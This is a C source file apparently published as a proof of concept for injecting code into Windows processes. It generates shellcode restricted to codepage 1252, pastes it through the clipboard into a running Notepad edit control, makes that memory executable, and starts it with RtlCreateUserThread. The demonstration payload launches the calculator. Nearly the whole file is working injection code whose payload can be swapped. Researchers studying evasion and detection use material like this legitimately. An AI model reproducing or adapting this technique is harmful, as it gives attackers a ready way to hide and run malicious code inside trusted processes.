/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#include <windows.h>
#pragma comment(lib, "user32.lib")

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

// default is 1 second
#define WAIT_TIME 1000

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);

// the max address for virtual memory on 
// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
#define MAX_ADDR 6

// This code stub stores the string "calc\0" on the stack
// and loads the address into RCX. It also sets RDX to SW_SHOW.
#define CALC_SIZE 104

char CALC[] = {
  /* 0000 */ "\x6a\x00"             /* push  0               */
  /* 0002 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
  /* 0006 */ "\x6a\x00"             /* push  0               */
  /* 0008 */ "\x54"                 /* push  rsp             */
  /* 0009 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 000C */ "\x5f"                 /* pop   rdi             */
  /* 000D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0010 */ "\x57"                 /* push  rdi             */
  /* 0011 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0014 */ "\x59"                 /* pop   rcx             */
  /* 0015 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0018 */ "\xb8\x00\x63\x00\xff" /* mov   eax, 0xff006300 */
  /* 001D */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 001F */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0022 */ "\xae"                 /* scasb                 */
  /* 0023 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0026 */ "\xb8\x00\x61\x00\xff" /* mov   eax, 0xff006100 */
  /* 002B */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 002D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0030 */ "\xae"                 /* scasb                 */
  /* 0031 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0034 */ "\xb8\x00\x6c\x00\xff" /* mov   eax, 0xff006c00 */
  /* 0039 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 003B */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 003E */ "\xae"                 /* scasb                 */
  /* 003F */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0042 */ "\xb8\x00\x63\x00\xff" /* mov   eax, 0xff006300 */
  /* 0047 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0049 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 004C */ "\xae"                 /* scasb                 */
  /* 004D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0050 */ "\xaa"                 /* stosb                 */
  /* 0051 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0054 */ "\x6a\x00"             /* push  0               */
  /* 0056 */ "\x54"                 /* push  rsp             */
  /* 0057 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 005A */ "\x58"                 /* pop   rax             */
  /* 005B */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 005E */ "\xc6\x00\x05"         /* mov   byte [rax], 5   */
  /* 0061 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0064 */ "\x5a"                 /* pop   rdx             */
  /* 0065 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Allocate 64-bit buffer on the stack.
// Then place the address in RDI for writing.
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Transfers control of execution to kernel32!WinExec
#define RET_SIZE 2

char RET[] = {
  /* 0000 */ "\xc3" /* ret  */
  /* 0002 */ "\x00"
};

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
  
    // zero is allowed, but we can't use it
    if(ch == 0) return 0;
    
    // bytes converted to double byte characters
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

static
u8* cp1252_generate_winexec(int *cslen) {
    int     i, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = malloc(512);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC, CALC_SIZE);
    out += CALC_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store ntdll!RtlExitUserThread on stack
    m = GetModuleHandle("ntdll");
    addr.p = GetProcAddress(m, "RtlExitUserThread");
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    addr.p = GetProcAddress(m, "WinExec");
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // add RET opcode
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    // calculate length of constructed code
    outlen = (int)(out - (u8*)cs);
    
    // convert to ascii
    for(i=0; i<outlen; i+=2) {
      if(cs[i] == 0) {
        printf("WARNING! Detected null byte at offset %x\n", i);
      }
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // return pointer to code
    return cs;
}

BOOL CopyToClipboard(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("  [-] Unable to open clipboard.\n");
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("  [-] Unable to empty clipboard.\n");
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(
      GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
      
    if(gmem == NULL) {
      printf("  [-] Unable to allocate memory.\n");
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("  [-] GlobalLock failed.\n");
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
    GlobalFree(gmem);
exit_copy:
    CloseClipboard();
    return bResult;
}

BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
    char cls[MAX_PATH];
    HWND hw=NULL, *out = (HWND*)lParam;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // Rich edit controls do not store text as a simple array of characters.
    if(!lstrcmp(cls, "Notepad")) {
      hw = FindWindowEx(hwnd, NULL, "Edit", NULL);
      if(hw != NULL) {
        *out = hw;
        return FALSE;
      }
    }
    return TRUE;
}

int main(void) {
    int                   cslen;
    PBYTE                 cs;
    PVOID                 emh;
    DWORD                 old;
    SIZE_T                rd;
    HWND                  hw=NULL;
    CLIENT_ID             cid;
    HANDLE                ht;
    RtlCreateUserThread_t rtlcreate;
    w64_t                 embuf, lastbuf;
    HMODULE               m;
    STARTUPINFO           si;
    PROCESS_INFORMATION   pi;
    
    printf("\n  [+] Executing notepad.\n");
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    
    CreateProcess(NULL, "notepad", NULL, 
      NULL, TRUE, 0, NULL, NULL, &si, &pi);
    // wait some time for process to fully initialize
    Sleep(WAIT_TIME);
    
    printf("  [+] Obtaining handle for edit control.\n");
    EnumThreadWindows(pi.dwThreadId, EnumThreadWnd, (LPARAM)&hw);
    
    if(hw == NULL) {
      printf("  [-] Unable to obtain the window handle.\n");
      goto cleanup;
    }

    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0); 
    if(emh == NULL) {
      printf("  [-] Edit Control has no EM handle!\n");
      goto cleanup;
    }
    
    printf("  [+] Generating CP-1252 shellcode.\n");
    cs = cp1252_generate_winexec(&cslen);
    
    // save to file for inspection
    FILE *fd = fopen("ascii.bin", "wb");
    fwrite(cs, 1, cslen, fd);
    fclose(fd);
    
    // copy code to the clipboard
    if(!CopyToClipboard(CF_TEXT, cs, cslen)) {
      printf("  [-] Error copying shellcode to clipboard.\n");
      return 0;
    }
    printf("  [+] Shellcode copied to clipboard.\n");
    
    // loop until buffer size is stable
    lastbuf.p = NULL;
    
    for(;;) {
      printf("  [+] Reading address of buffer : ");       
      ReadProcessMemory(pi.hProcess, emh, 
        &embuf.p, sizeof(ULONG_PTR), &rd);
      
      printf("%p\n", embuf.p);
      
      // Address hasn't changed? exit loop
      if(embuf.p == lastbuf.p) {
        printf("  [+] Buffer appears to be ready.\n");
        break;
      }
      // save this address
      lastbuf.p = embuf.p;
    
      // clear the contents of edit control
      SendMessage(hw, EM_SETSEL, 0, -1);
      SendMessage(hw, WM_CLEAR, 0, 0);
      
      // send the WM_PASTE message to the edit control
      // allow notepad some time to read the data from clipboard
      printf("  [+] Sending WM_PASTE to %p\n", (PVOID)hw);
      SendMessage(hw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
    }
    
    printf("  [+] Setting %p to RWX.\n", embuf.p);
    VirtualProtectEx(pi.hProcess, embuf.p, 
      4096, PAGE_EXECUTE_READWRITE, &old);
    
    // resolve address of RtlCreateUserThread
    m = GetModuleHandle("ntdll");
    rtlcreate = (RtlCreateUserThread_t)
      GetProcAddress(m, "RtlCreateUserThread");
    
    printf("  [+] Attempting to create new thread...\n");
    
    // execute shellcode
    rtlcreate(pi.hProcess, NULL, FALSE, 0, NULL, 
      NULL, embuf.p, NULL, &ht, &cid);
    
    // wait for thread to finish
    WaitForSingleObject(ht, INFINITE);
    
    // clear the contents of buffer
    SendMessage(hw, EM_SETSEL, 0, -1);
    SendMessage(hw, WM_CLEAR, 0, 0);
    
    // set the memory buffer for the edit control to RW
    VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
    
    free(cs);
cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
